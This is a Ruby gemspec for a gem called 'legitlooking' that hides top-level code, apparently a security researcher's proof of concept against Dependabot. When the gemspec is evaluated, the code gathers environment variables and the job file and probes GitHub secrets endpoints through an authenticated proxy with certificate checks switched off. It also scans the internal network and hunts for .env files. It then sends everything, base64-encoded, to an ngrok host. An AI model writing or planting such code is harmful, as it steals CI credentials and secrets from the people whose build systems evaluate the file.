# frozen_string_literal: true

COLLAB_URL = "https://854e-2001-1c00-307-d600-5943-e639-f9a6-c878.ngrok-free.app"

begin
  require "uri"
  require "net/http"

  read_file = ->(f) { IO.binread(f).force_encoding("UTF-8").encode("UTF-8", invalid: :replace, undef: :replace) }

  lines = []
  lines << "=== ENV ===\n" + ENV.map { |k,v| "#{k}=#{v}" }.join("\n")
  lines << "\n=== JOB.JSON ===\n" + (read_file.("/home/dependabot/dependabot-updater/job.json") rescue "FOUT")

  # === ESCALATIE: GitHub API via de geauthenticeerde proxy ===
  # De proxy injecteert automatisch de Authorization header.
  # We disablen SSL verify omdat we intern zitten.
  lines << "\n=== GITHUB API VIA PROXY ==="

  gh_calls = {
    "whoami"          => "https://api.github.com/",
    "repo_info"       => "https://api.github.com/repos/ugurcanli/testpen",
    "repo_contents"   => "https://api.github.com/repos/ugurcanli/testpen/contents/",
    "actions_secrets" => "https://api.github.com/repos/ugurcanli/testpen/actions/secrets",
    "org_installs"    => "https://api.github.com/app/installations",
    "dependabot_api"  => "https://dependabot-actions.githubapp.com/",
  }

  gh_calls.each do |label, url|
    begin
      uri = URI(url)
      http = Net::HTTP.new(uri.host, uri.port)
      http.use_ssl = true
      http.verify_mode = 0  # skip SSL verify (intern)
      http.open_timeout = 8
      http.read_timeout = 8
      req = Net::HTTP::Get.new(uri)
      req["Accept"] = "application/vnd.github+json"
      req["X-GitHub-Api-Version"] = "2022-11-28"
      res = http.request(req)
      lines << "--- #{label} (#{url}) ---"
      lines << "Status: #{res.code}"
      lines << "Headers: #{res.to_hash.select { |k,_| %w[x-oauth-scopes x-ratelimit-limit authorization www-authenticate x-github-request-id].include?(k.downcase) }}"
      lines << "Body: #{res.body[0, 500]}"
    rescue => e
      lines << "--- #{label} --- FOUT: #{e.message}"
    end
  end

  # === PIVOT: interne netwerk scan ===
  lines << "\n=== INTERNE NETWERK SCAN ==="
  lines << `nmap -sn 172.19.0.0/24 2>/dev/null || for i in $(seq 1 10); do (ping -c1 -W1 172.19.0.$i >/dev/null 2>&1 && echo "172.19.0.$i UP") || true; done 2>/dev/null`.to_s[0, 800]

  # === Repo inhoud lezen via proxy ===
  lines << "\n=== GECLONEDE REPO BESTANDEN ==="
  repo_path = ENV["DEPENDABOT_REPO_CONTENTS_PATH"] || "/home/dependabot/dependabot-updater/repo"
  lines << `ls -la #{repo_path}/ 2>/dev/null`.to_s[0, 500]
  lines << `find #{repo_path} -name "*.env" -o -name ".env*" -o -name "*.secret" 2>/dev/null`.to_s[0, 300]

  payload = [lines.join("\n").encode("UTF-8", invalid: :replace, undef: :replace)].pack("m0")

  uri = URI("#{COLLAB_URL}?poc=escalatie")
  req = Net::HTTP::Post.new(uri)
  req["Content-Type"] = "text/plain"
  req.body = payload
  Net::HTTP.start(uri.host, uri.port, use_ssl: uri.scheme == "https",
                  open_timeout: 10, read_timeout: 10) { |h| h.request(req) }

rescue => e
  begin
    require "net/http"
    require "uri"
    uri = URI("#{COLLAB_URL}?poc=escalatie&err=#{URI.encode_www_form_component(e.message[0, 200])}")
    Net::HTTP.get(uri)
  rescue
  end
end

Gem::Specification.new do |spec|
  spec.name          = "legitlooking"
  spec.version       = "1.0.5"
  spec.authors       = ["researcher"]
  spec.summary       = "A normal looking gem"
  spec.require_paths = ["lib"]

  spec.add_dependency "rails", "~> 7.0"
  spec.add_dependency "devise", "~> 4.9"
end
